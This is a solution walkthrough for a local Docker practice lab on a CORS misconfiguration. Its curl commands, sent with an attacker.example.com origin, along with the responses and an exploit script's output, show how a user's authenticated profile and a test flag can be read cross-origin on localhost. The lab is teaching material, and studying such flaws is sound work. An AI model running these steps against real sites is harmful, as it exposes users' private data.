# Walkthrough

This is the full solution. Try the lab yourself first.

## Setup

```bash
docker compose up --build -d
```

The first build takes about 30 seconds. Subsequent starts use the cached image and are instant.

## Step 1: Confirm the misconfiguration

Send a preflight request with an arbitrary origin:

```bash
curl -sI -X OPTIONS http://localhost:8080/api/profile \
  -H 'Origin: https://attacker.example.com' \
  -H 'Access-Control-Request-Method: GET'
```

```
HTTP/1.0 204 No Content
Access-Control-Allow-Origin: https://attacker.example.com
Access-Control-Allow-Credentials: true
Vary: Origin
Access-Control-Allow-Methods: GET, OPTIONS
Access-Control-Allow-Headers: Content-Type
```

The server reflected the attacker origin back with credentials allowed.

## Step 2: Login

```bash
curl -sc /tmp/cors-cookies.txt -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}'
```

```json
{"status": "logged in", "user": "alice"}
```

## Step 3: Cross-origin credential read

```bash
curl -sb /tmp/cors-cookies.txt http://localhost:8080/api/profile \
  -H 'Origin: https://attacker.example.com'
```

```json
{
  "username": "alice",
  "email": "alice@corp.internal",
  "role": "user",
  "flag": "POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}"
}
```

## Alternative: use the exploit script

```bash
python3 exploit/exploit.py http://localhost:8080
```

```
[*] Target: http://localhost:8080

[*] Step 1: logging in as alice...
    Cookie: session=3f8a...

[*] Step 2: sending OPTIONS preflight from https://attacker.example.com...
    Access-Control-Allow-Origin:      https://attacker.example.com
    Access-Control-Allow-Credentials: true
    Server reflects attacker origin. Credentials will be sent cross-origin.

[*] Step 3: reading /api/profile as https://attacker.example.com with session cookie...

[+] Cross-origin credential leak confirmed.
[+] Flag: POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}
```

Flags are random per container start. The values above are examples.

## Teardown

```bash
docker compose down
```
